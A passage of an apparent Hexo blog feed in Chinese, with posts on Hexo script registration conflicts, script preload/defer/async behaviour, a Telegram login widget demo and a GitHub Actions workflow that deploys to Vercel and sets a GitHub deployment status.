当该过滤器被触发时，这两个函数都会被执行（即，执行了两次逻辑）！ 执行顺序通常取决于文件加载顺序（文件名排序或目录结构）。</p><p>影响范围： 主题目录下的 scripts&#x2F;、scripts&#x2F;filters&#x2F;、scripts&#x2F;any-subfolder&#x2F; 等 所有子目录 中的脚本文件，只要它们被加载并注册了同名过滤器。</p><ol start="2"><li><code>events (事件)</code> - 🚫 受影响 (重复执行)</li></ol><p>问题本质： 使用 hexo.on(‘event_name’, function(){…}) 监听 Hexo 事件。</p><p>重复执行： 如果在 两个不同的 .js 文件 中监听了 同一个事件（’event_name’），那么 当该事件被触发时，这两个监听函数都会被执行！</p><p>影响范围： 同样影响主题目录下 scripts&#x2F;、scripts&#x2F;events&#x2F; 等所有子目录中的脚本文件。</p><ol start="3"><li><code>helpers (辅助函数)</code> - ⚠️ 影响方式不同 (覆盖而非重复执行)</li></ol><p>问题本质： 使用 hexo.extend.helper.register(‘helper_name’, function(){…}) 注册的辅助函数也是 全局注册。</p><p>重复注册后果： 如果在 两个不同的 .js 文件 中注册了 同名 的辅助函数（’helper_name’），那么 后注册的函数会完全覆盖先注册的函数。 最终在模板中调用 helper_name() 时，只会执行最后注册的那个函数。</p><p>与过滤器的区别： 它不会导致函数被执行多次，但会导致 预期外的函数被替换，同样会造成问题（功能失效或行为改变）。</p><p>影响范围： 同样影响主题目录下 scripts&#x2F;、scripts&#x2F;helpers&#x2F; 等所有子目录中的脚本文件。</p><blockquote><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p><strong><code>备份脚本</code>可能会出现的<code>冲突</code></strong></p><ol><li>发生在<code>注册的组件名</code>（filter_name, helper_name, event_name）上，而<code>不是文件名</code>上。仅仅使用不同的文件名（或放在不同子目录如 scripts&#x2F;filters&#x2F; vs scripts&#x2F;helpers&#x2F;），无法隔离在 hexo 全局对象上注册的组件。</li><li><code>filters</code> 和 <code>events</code> 会导致 <strong>重复执行</strong>，而<code>helpers</code> 会导致 <strong>覆盖</strong>。这是 Hexo 插件&#x2F;脚本机制决定的。</li></ol><p><strong>如何备份脚本才能<code>避免冲突</code>?</strong></p><ol><li>将备份脚本中的 hexo.extend.filter.register、hexo.extend.helper.register、hexo.on 等关键注册行直接用 &#x2F;&#x2F; 或 &#x2F;* *&#x2F; <code>注释掉</code>，确保它们不会被执行。这是比较可靠的手动方法。</li><li>将所要备份的hexo脚本，<code>移出hexo加载路径</code>。</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Js预加载区分</title>
      <link href="/posts/js-yu-jia-zai-qu-fen/"/>
      <url>/posts/js-yu-jia-zai-qu-fen/</url>
      
        <content type="html"><![CDATA[<h2 id="一、link标签rel属性值preload与prefetch差异"><a href="#一、link标签rel属性值preload与prefetch差异" class="headerlink" title="一、link标签rel属性值preload与prefetch差异"></a>一、<code>link标签</code>rel属性值<code>preload</code>与<code>prefetch</code>差异</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;preload&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">as</span>=<span class="string">&quot;script&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>注意： 特殊的 as 属性取值：<br>style 和 script 是最常用的两个值，因为它们分别对应预加载 CSS 和 JavaScript 文件。其他如 image、font 和 audio 也是在处理资源时比较常见的需求。<br>使用 as 属性时，除了指定合适的资源类型，还可以根据需要指定 type（如字体文件的 MIME 类型）以及 crossorigin（用于跨域请求时指定 CORS 策略）。</p><h3 id="相同点："><a href="#相同点：" class="headerlink" title="相同点："></a>相同点：</h3><ol><li>只是利用多余带宽提前加载资源，但js不执行，图片、样式等也主动不引入；</li><li>不阻塞dom构建和css渲染，即在页面渲染的同时下载其它资源。</li></ol><h3 id="不同点："><a href="#不同点：" class="headerlink" title="不同点："></a>不同点：</h3><ol><li>preload优先级高，一般用于当前页面重要资源的提前下载；</li><li>而prefetch优先级低，一般用于提前下载子页面等依赖的资源；</li></ol><h2 id="二、script标签之defer与async属性-差异"><a href="#二、script标签之defer与async属性-差异" class="headerlink" title="二、script标签之defer与async属性 差异"></a>二、<code>script标签</code>之<code>defer</code>与<code>async</code>属性 差异</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;&quot;</span> defer &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="没有defer或async"><a href="#没有defer或async" class="headerlink" title="没有defer或async"></a>没有<code>defer</code>或<code>async</code></h4><ol><li><code>下载</code>和<code>执行</code>均会<code>阻塞</code>HTML 解析，适合必须依赖 HTML 内容的脚本。</li></ol><h4 id="defer"><a href="#defer" class="headerlink" title="defer"></a><code>defer</code></h4><ol><li><p>不依赖于 DOM 解析完成后的操作，但需要在 DOM 完全加载之后执行的脚本。例如，初始化页面交互、绑定事件等；</p></li><li><p>与没有 defer 属性的普通<code>&lt;script&gt;标签</code>不同，带有 defer 属性的<code>&lt;script&gt;标签</code>会延迟执行，但它仍会在页面解析过程中开始异步下载。也就是说，defer 属性让脚本的下载过程异步进行，但不会阻塞页面的其他内容（如 DOM 或其他资源）的加载。</p></li><li><p>脚本执行顺序：所有带有 defer 属性的脚本会按照它们在文档中的出现顺序来执行，即使它们是异步下载的。也就是说，defer 保证了脚本按顺序执行，而不是基于下载完成的顺序；</p></li><li><p>多脚本<code>defer</code>，保证在html解析及下载依赖css完成后，在脚本依序执行阶段能缓解带宽压力（不过太多的defer在并行加载阶段，也会占用带宽；可结合脚本合并【合并请求】，代码压缩优化），利于首屏加载。</p></li><li><p>执行时间：这些脚本会在页面解析完成后、DOMContentLoaded 事件触发之前执行。</p><p><img src="/posts/js-yu-jia-zai-qu-fen/defer.webp" alt="defer加载和执行时机"></p></li></ol><p><em>执行顺序图解：</em></p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  sequenceDiagram participant Browser participant DOM participant Resources Browser-&gt;&gt;DOM: 开始解析HTML Browser-&gt;&gt;DOM: 构建DOM树 DOM--&gt;&gt;Browser: DOMContentLoaded触发 (DOM就绪) Browser-&gt;&gt;Resources: 加载外部资源 Resources--&gt;&gt;Browser: 所有资源加载完成 Browser-&gt;&gt;Browser: window.onload触发 Browser-&gt;&gt;Browser: document.readyState &#x3D; &#39;complete&#39;  </pre></div><p><em>脚本加载策略对比</em></p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph LR    A[加载策略] --&gt; B[无属性]    A --&gt; C[async]    A --&gt; D[defer]    B --&gt; B1[阻塞HTML解析]    B --&gt; B2[声明顺序执行]    B --&gt; B3[立即执行]    C --&gt; C1[不阻塞解析]    C --&gt; C2[下载顺序执行]    C --&gt; C3[下载完立即执行]    D --&gt; D1[不阻塞解析]    D --&gt; D2[声明顺序执行]    D --&gt; D3[DOMContentLoaded前执行]  </pre></div><div class = "md-table"><table><thead><tr><th><strong>场景</strong></th><th><strong>推荐使用</strong></th><th><strong>原因说明</strong></th></tr></thead><tbody><tr><td><code>修改DOM元素</code></td><td>DOMContentLoaded</td><td>无需等待资源加载，可尽早操作DOM</td></tr><tr><td><code>获取图片/iframe尺寸</code></td><td>window.onload</td><td>需要确保所有资源已加载才能获得准确尺寸</td></tr><tr><td><code>初始化第三方分析脚本</code></td><td>DOMContentLoaded</td><td>尽早收集用户行为数据</td></tr><tr><td><code>显示&quot;加载完成&quot;提示</code></td><td>document.readyState</td><td>精确检测最终完成状态</td></tr><tr><td><code>执行依赖完整布局的JS</code></td><td>window.onload</td><td>如复杂的Canvas绘图需要完整布局信息</td></tr><tr><td><code>预加载后续资源</code></td><td>DOMContentLoaded</td><td>主内容就绪后即可预加载次要资源</td></tr><tr><td><code>单页应用(SPA)挂载</code></td><td>DOMContentLoaded</td><td>现代框架(React&#x2F;Vue等)通常在此事件挂载应用</td></tr></tbody></table></div><h5 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h5><ol><li>浏览器解析 HTML 文件，从上到下逐行解析。</li><li>遇到<code> &lt;script defer=&quot;true&quot; src=&quot;script.js&quot;&gt; 标签</code>时，浏览器会开始异步加载 script.js 文件。</li><li>同时，浏览器继续解析页面的其他 HTML 元素，解析 CSS 文件（如 <code>&lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;</code>），并开始应用 CSS 样式。</li><li>当 HTML 文档解析完毕，defer 属性的脚本会按顺序执行，确保文档的 DOM 结构已经完整，但此时 CSS 渲染已经完成。<br>（脚本尝试强制触发浏览器对某些样式计算（如 <code>getComputedStyle</code>）时可能被延迟，或 JS 存在动态加载额外的 CSS 文件，最好以<code>onload</code>监听为准）</li><li>在<code>defer脚本</code>均执行完成后，<code>DOMContentLoaded</code> 事件会被触发。</li></ol><h4 id="async"><a href="#async" class="headerlink" title="async"></a><code>async</code></h4><ol><li>从<code>script标签</code>位置开始下载：浏览器会在解析到 async 属性的<code>&lt;script&gt;标签</code>时立即开始下载（<code>下载过程</code>不阻塞 html解析）。</li><li>下载完成后执行：脚本会在下载完成后立即执行，执行顺序取决于各自下载的顺序，而不是在 HTML 中的顺序（<code>执行过程</code>占用主线程，会阻塞 html解析和依赖的css下载，优先执行完毕后才会继续解析html；太多async会抢占带宽，影响css等关键资源加载，有碍页面渲染）。</li><li>主要用于“广告”，“监视脚本”或其它第三方独立插件。</li></ol><p><img src="/posts/js-yu-jia-zai-qu-fen/defer%E4%B8%8Easync%E5%AF%B9%E6%AF%94.webp" alt="defer与async对比"></p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p><code>&lt;link rel=&quot;preload&quot; href=&quot;&quot; as=&quot;script&quot;&gt;</code>能缩短加载其它页面的时间，但使用太多可能造成流量拥堵，不利于首屏加载。同时与<code>&lt;script src=&quot;&quot; defer /&gt;</code>能提前下载关键资源在且dom完成后顺序执行，是个好实践。</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Telegram测试</title>
      <link href="/posts/telegram-ce-shi/"/>
      <url>/posts/telegram-ce-shi/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><blockquote><p>一、电报机器人快捷认证登录，登录成功后会返回 昵称，会话ID，和 用户名。<br>二、只能作为验证身份，获取用户部分信息使用。本地退出只能通过清除浏览器cookie中的token，若要完全退出该浏览器认证终端，须在 Telegram 手动终止。</p></blockquote><h2 id="效果（验证）"><a href="#效果（验证）" class="headerlink" title="效果（验证）:"></a>效果（验证）:</h2><p><strong><mark class="hl-label red">按钮区：</mark> </strong></p><script type="text/javascript">  function onTelegramAuth(user) {    alert('Logged in as ' + user.first_name + ' ' + user.last_name + ' (' + user.id + (user.username ? ', @' + user.username : '') + ')');  }</script><div class="tip warning"><p>直接进入当前页面 无 授权登录按钮，须在 科学条件 下，刷新 当前页面 才可看到该 授权登录按钮！！</p></div><script defer src="https://telegram.org/js/telegram-widget.js?22"data-telegram-login="Cecilzhubot"data-size="large"data-radius="20"data-onauth="onTelegramAuth(user)"data-request-access="write"></script><div class="tip success"><p>须在 科学条件 下，才可看到该 授权登录按钮，无需二次刷新页面！！</p></div><style>   iframe {      width: 100%; /* 调整宽度 */      height: 100px; /* 调整高度 */      border: none;      border-radius: 20px;    }</style><iframe src="/posts/telegram-ce-shi/telegram-widget"></iframe><p><strong><mark class="hl-label blue">图示区：</mark> </strong><br>1.登陆前，</p><p><img src="/posts/telegram-ce-shi/telegram-1.webp" alt="telegram-1"></p><p>2.在已登录telegram的设备中，进行第三方登录的确认，</p><p><img src="/posts/telegram-ce-shi/telegram-2.webp" alt="telegram-2"></p><p>3.登陆成功后，</p><p><img src="/posts/telegram-ce-shi/telegram-3.webp" alt="telegram-3"></p><p><img src="/posts/telegram-ce-shi/telegram-4.webp" alt="telegram-4"></p><p>4.退出，须清理对应cookie记录。</p><h2 id="主要代码如下："><a href="#主要代码如下：" class="headerlink" title="主要代码如下："></a>主要代码如下：</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">onTelegramAuth</span>(<span class="params">user</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&#x27;Logged in as &#x27;</span> + user.<span class="property">first_name</span> + <span class="string">&#x27; &#x27;</span> + user.<span class="property">last_name</span> + <span class="string">&#x27; (&#x27;</span> + user.<span class="property">id</span> + (user.<span class="property">username</span> ? <span class="string">&#x27;, @&#x27;</span> + user.<span class="property">username</span> : <span class="string">&#x27;&#x27;</span>) + <span class="string">&#x27;)&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;telegram-container&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>使用 Telegram 登录<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">&quot;https://telegram.org/js/telegram-widget.js?22&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">data-telegram-login</span>=<span class="string">&quot;Cecilzhubot&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">data-size</span>=<span class="string">&quot;large&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">data-radius</span>=<span class="string">&quot;20&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">data-onauth</span>=<span class="string">&quot;onTelegramAuth(user)&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">data-request-access</span>=<span class="string">&quot;write&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 其它 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Shell及githubworkflow初探</title>
      <link href="/posts/shell-ji-github-workflow-chu-tan/"/>
      <url>/posts/shell-ji-github-workflow-chu-tan/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>vercel成功部署后，通过githubAPI 将vercel项目的“预览链接” 赋值给github的environment URL</p><h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h3><p><img src="/posts/shell-ji-github-workflow-chu-tan/1-environment-url.webp" alt="1-environment-url"></p><span id="more"></span><h3 id="一、将github仓库项目部署到vercel"><a href="#一、将github仓库项目部署到vercel" class="headerlink" title="一、将github仓库项目部署到vercel"></a>一、将github仓库项目部署到vercel</h3><p>可指定项目，“–name“字段貌似可简写为“-n“，后可加“vercel项目名”，或“vercel项目ID”</p><p><img src="/posts/shell-ji-github-workflow-chu-tan/2-%E9%83%A8%E7%BD%B2%E5%88%B0Vercel-%E6%8C%87%E5%AE%9A%E9%A1%B9%E7%9B%AE.webp" alt="2-部署到Vercel-指定项目"></p><h3 id="二、得到已关联“vercel项目”的-域名（可选）"><a href="#二、得到已关联“vercel项目”的-域名（可选）" class="headerlink" title="二、得到已关联“vercel项目”的 域名（可选）"></a>二、得到已关联“vercel项目”的 域名（可选）</h3><p>vercel项目名”或“vercel项目ID”,请求vercelAPI，以获取项目信息，提取域名。</p><p><img src="/posts/shell-ji-github-workflow-chu-tan/3-getVercelProjectInf-GET-domain.webp" alt="3-getVercelProjectInf"></p><h3 id="三、创建“github发布状态”"><a href="#三、创建“github发布状态”" class="headerlink" title="三、创建“github发布状态”"></a>三、创建“github发布状态”</h3><p>请求githubAPI，“<a href="https://api.github.com/repos/$">https://api.github.com/repos/$</a>&#x2F;deployments“，会返回此次github提交的“github发布ID”，保存。</p><p><img src="/posts/shell-ji-github-workflow-chu-tan/4-%E5%88%9B%E5%BB%BAgithub%E5%8F%91%E5%B8%83%E7%8A%B6%E6%80%81-%E5%BE%97%E5%88%B0github%E5%8F%91%E5%B8%83ID.webp" alt="4-创建github发布状态-得到github发布ID"></p><h3 id="四、更新“github发布状态”"><a href="#四、更新“github发布状态”" class="headerlink" title="四、更新“github发布状态”"></a>四、更新“github发布状态”</h3><p>使用“github发布ID”，请求githubAPI，将vercel平台提供的已部署vercel项目的“预览链接”赋值给github的environment URL</p><p><img src="/posts/shell-ji-github-workflow-chu-tan/5-%E6%A0%B9%E6%8D%AE%E8%AF%A5github%E5%8F%91%E5%B8%83ID%E6%9B%B4%E6%96%B0%E5%8F%91%E5%B8%83%E7%8A%B6%E6%80%81.webp" alt="5-根据该github发布ID更新发布状态"></p><h3 id="五、deploy-yml完整代码（含-github仓库secret）："><a href="#五、deploy-yml完整代码（含-github仓库secret）：" class="headerlink" title="五、deploy.yml完整代码（含 github仓库secret）："></a>五、deploy.yml完整代码（含 github仓库secret）：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">name: Deploy to Vercel</span><br><span class="line"></span><br><span class="line">on:</span><br><span class="line">  push:</span><br><span class="line">    branches:</span><br><span class="line">      - master</span><br><span class="line"></span><br><span class="line">jobs:</span><br><span class="line">  deploy:</span><br><span class="line">    runs-on: ubuntu-latest</span><br><span class="line">    </span><br><span class="line">    steps:</span><br><span class="line">      - name: Checkout repository</span><br><span class="line">        uses: actions/checkout@v2</span><br><span class="line">    </span><br><span class="line">      - name: Install Vercel CLI</span><br><span class="line">        run: npm install -g vercel</span><br><span class="line">    </span><br><span class="line">      - name: Deploy to Vercel And Get Deployment URL</span><br><span class="line">        id: get-url</span><br><span class="line">        env:</span><br><span class="line">          VERCEL_TOKEN: $&#123;&#123; secrets.VERCEL_TOKEN &#125;&#125;</span><br><span class="line">        run: |</span><br><span class="line">          # 或不使用&quot;--name&quot;或&quot;-n&quot;指定部署到vercel中已存在的某个项目，而是默认使用git仓库名作为vercel项目名</span><br><span class="line">          # vercel --prod --token $&#123;&#123; secrets.VERCEL_TOKEN &#125;&#125; --yes</span><br><span class="line">          vercel --prod --token $&#123;&#123; secrets.VERCEL_TOKEN &#125;&#125; --yes --name $&#123;&#123;secrets.VERCEL_PROJECT_EAMON_ID&#125;&#125;</span><br><span class="line">          DEPLOYMENT_URL=$(vercel --token $&#123;&#123; secrets.VERCEL_TOKEN &#125;&#125; ls --prod | grep -o &#x27;https://[^ ]*&#x27; | head -n 1)</span><br><span class="line">          </span><br><span class="line">          # 1.可设置为 环境变量，在其他步骤使用</span><br><span class="line">          echo &quot;DEPLOYMENT_URL=$&#123;DEPLOYMENT_URL&#125;&quot; &gt;&gt; $GITHUB_ENV</span><br><span class="line">          # 2.将 $DEPLOYMENT_URL 的值 赋值给当前作业的 输出变量 DEPLOYMENT_URL，在其他步骤以“steps.get-url.outputs.DEPLOYMENT_URL“形式引用（即将废弃）</span><br><span class="line">          # echo &quot;::set-output name=DEPLOYMENT_URL::$DEPLOYMENT_URL&quot;</span><br><span class="line">          # 3.也可写入txt，在其他步骤使用（查看所有 环境变量，找到 环境变量DEPLOYMENT_URL的键值对，取其值，保存为txt文本 ）</span><br><span class="line">          cat $GITHUB_ENV | grep DEPLOYMENT_URL | cut -d&#x27;=&#x27; -f2 &gt; DEPLOYMENT_URL.txt</span><br><span class="line">          </span><br><span class="line">          a=$(cat DEPLOYMENT_URL.txt) # 赋值表达式“=“两边 不能有空格</span><br><span class="line">          echo $a</span><br><span class="line">          # 打印变量（含 环境变量）的 3种 方式：echo &quot;我是$a&quot;、echo &quot;我是$&#123;a&#125;&quot;、echo $a</span><br><span class="line">    </span><br><span class="line">      - name: Get Vercel Project Info</span><br><span class="line">        env:</span><br><span class="line">          VERCEL_TOKEN: $&#123;&#123; secrets.VERCEL_TOKEN &#125;&#125;</span><br><span class="line">        run: |</span><br><span class="line">         curl -s -H &quot;Authorization: Bearer $VERCEL_TOKEN&quot; https://api.vercel.com/v6/projects/$&#123;&#123;secrets.VERCEL_PROJECT_EAMON_ID&#125;&#125; &gt; vercel_project.json</span><br><span class="line">         cat vercel_project.json</span><br><span class="line">    </span><br><span class="line">      - name: Extract Custom Domain</span><br><span class="line">        run: |</span><br><span class="line">          # 提取 domain</span><br><span class="line">          DOMAIN=$(cat vercel_project.json | jq -r &#x27;.alias[0].domain // empty&#x27;)</span><br><span class="line">          echo &quot;Custom Domain: $DOMAIN&quot;</span><br><span class="line">          echo &quot;CUSTOM_DOMAIN=$&#123;DOMAIN&#125;&quot; &gt;&gt; $GITHUB_ENV</span><br><span class="line">          </span><br><span class="line">          # 若vercel平台待部署项目 未关联域名，则使用 DEPLOYMENT_URL作为environment_url【须以https开头】</span><br><span class="line">          if [ -z &quot;$DOMAIN&quot; ]; then</span><br><span class="line">            CUSTOM_DOMAIN=$DEPLOYMENT_URL</span><br><span class="line">          fi</span><br><span class="line">        </span><br><span class="line">      - name: Create deployment status on GitHub</span><br><span class="line">        env:</span><br><span class="line">          GITHUB_TOKEN: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125;</span><br><span class="line">        run: |</span><br><span class="line">          curl -X POST \</span><br><span class="line">            -H &quot;Authorization: token $GITHUB_TOKEN&quot; \</span><br><span class="line">            -H &quot;Accept: application/vnd.github.v3+json&quot; \</span><br><span class="line">            https://api.github.com/repos/$&#123;&#123; github.repository &#125;&#125;/deployments \</span><br><span class="line">            -d &#x27;&#123;</span><br><span class="line">                  &quot;ref&quot;: &quot;master&quot;,</span><br><span class="line">                  &quot;environment&quot;: &quot;vercel-prod&quot;,</span><br><span class="line">                  &quot;description&quot;: &quot;Deployment to Vercel&quot;,</span><br><span class="line">                  &quot;auto_merge&quot;: false,</span><br><span class="line">                  &quot;required_contexts&quot;: [],</span><br><span class="line">                  &quot;payload&quot;: &#123;&#125;,</span><br><span class="line">                  &quot;transient_environment&quot;: false,</span><br><span class="line">                  &quot;production_environment&quot;: true</span><br><span class="line">                &#125;&#x27; | jq -r &#x27;.id&#x27; &gt; deployment_id.txt</span><br><span class="line">    </span><br><span class="line">                  # txt形式，不同步骤之间传递值</span><br><span class="line">                  DEPLOYMENT_ID=$(cat deployment_id.txt)</span><br><span class="line">                  # 或 环境变量 形式，不同步骤之间传递值</span><br><span class="line">                  echo &quot;DEPLOYMENT_ID=$&#123;DEPLOYMENT_ID&#125;&quot; &gt;&gt; $GITHUB_ENV</span><br><span class="line">          </span><br><span class="line">      - name: Update deployment status</span><br><span class="line">        env:</span><br><span class="line">          GITHUB_TOKEN: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125;</span><br><span class="line">        run: |</span><br><span class="line">          DEPLOYMENT_URL=$(cat DEPLOYMENT_URL.txt)</span><br><span class="line">          DEPLOYMENT_ID=$(cat deployment_id.txt)</span><br><span class="line">          # 或 环境变量 DEPLOYMENT_ID=$&#123;&#123;env.DEPLOYMENT_ID&#125;&#125;</span><br><span class="line">          curl -X POST \</span><br><span class="line">            -H &quot;Authorization: token $GITHUB_TOKEN&quot; \</span><br><span class="line">            -H &quot;Accept: application/vnd.github.v3+json&quot; \</span><br><span class="line">            https://api.github.com/repos/$&#123;&#123; github.repository &#125;&#125;/deployments/$&#123;DEPLOYMENT_ID&#125;/statuses \</span><br><span class="line">            -d &#x27;&#123;</span><br><span class="line">                  &quot;state&quot;: &quot;success&quot;,</span><br><span class="line">                  &quot;description&quot;: &quot;Deployment to Vercel successful&quot;,</span><br><span class="line">                  &quot;auto_inactive&quot;: true,</span><br><span class="line">                  &quot;log_url&quot;: &quot;&#x27;$&#123;DEPLOYMENT_URL&#125;&#x27;&quot;,</span><br><span class="line">                  &quot;environment_url&quot;: &quot;&#x27;https://$CUSTOM_DOMAIN&#x27;&quot;</span><br><span class="line">                &#125;&#x27;</span><br></pre></td></tr></table></figure><h3 id="六、注意事项"><a href="#六、注意事项" class="headerlink" title="六、注意事项"></a>六、注意事项</h3><p>“jobs输出变量”、“环境变量”在json中的不同书写方式，注意“引号”。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">job输出变量 书写</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;environment_url&quot;</span>: <span class="string">&quot;&#x27;<span class="variable">$&#123;&#123;steps.get-url.outputs.DEPLOYMENT_URL&#125;</span>&#125;&#x27;&quot;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">环境变量 书写</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;log_url&quot;</span>: <span class="string">&quot;&#x27;&quot;</span><span class="variable">$&#123;&#123; env.DEPLOYMENT_URL &#125;</span>&#125;<span class="string">&quot;&#x27;&quot;</span>,</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;environment_url&quot;</span>: <span class="string">&quot;&#x27;<span class="variable">$&#123; DEPLOYMENT_URL &#125;</span>&#x27;&quot;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;environment_url&quot;</span>: <span class="string">&quot;&#x27;<span class="variable">$DEPLOYMENT_URL</span>&#x27;&quot;</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vercel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vercel部署方式</title>
      <link href="/posts/vercel-bu-shu-fang-shi-tan-tao/"/>
      <url>/posts/vercel-bu-shu-fang-shi-tan-tao/</url>
      
